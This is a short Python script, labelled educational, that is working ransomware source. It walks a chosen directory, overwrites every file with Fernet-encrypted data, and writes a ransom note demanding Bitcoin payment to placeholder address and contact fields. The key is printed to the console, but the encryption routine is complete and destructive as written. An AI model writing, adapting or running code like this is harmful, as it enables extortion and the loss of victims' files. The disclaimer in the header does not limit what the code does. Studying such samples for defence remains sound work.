"""
FOR EDUCATIONAL PURPOSES

USE ONLY IN CONTROLLED ENVIRONMENTS


GABRIEL ROZENDO
"""

import os

import cryptography.fernet

# Generate a key for encryption
key = cryptography.fernet.Fernet.generate_key()
cipher_suite = cryptography.fernet.Fernet(key)

# Define the directory to encrypt
directory_to_encrypt = '/path/to/target/directory'  # CHANGE

# Define the ransom note message
ransom_note_message = """
Your files have been encrypted.
To get the decryption key, send 0.1 BTC to the following address:
[Your Bitcoin Address Here]
After payment, contact us at [Your Contact Email Here] with your transaction ID to receive the decryption key.
"""


# Function to encrypt a file
def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = cipher_suite.encrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)


def write_ransom_note(directory):
    ransom_note_path = os.path.join(directory, 'README_FOR_DECRYPT.txt')
    with open(ransom_note_path, 'w') as file:
        file.write(ransom_note_message)


for root, dirs, files in os.walk(directory_to_encrypt):
    for file in files:
        file_path = os.path.join(root, file)
        encrypt_file(file_path)

# Write the ransom note in the specified directory
write_ransom_note(directory_to_encrypt)

# Print the encryption key (for demonstration purposes only)
print(f"Encryption key: {key.decode()}")
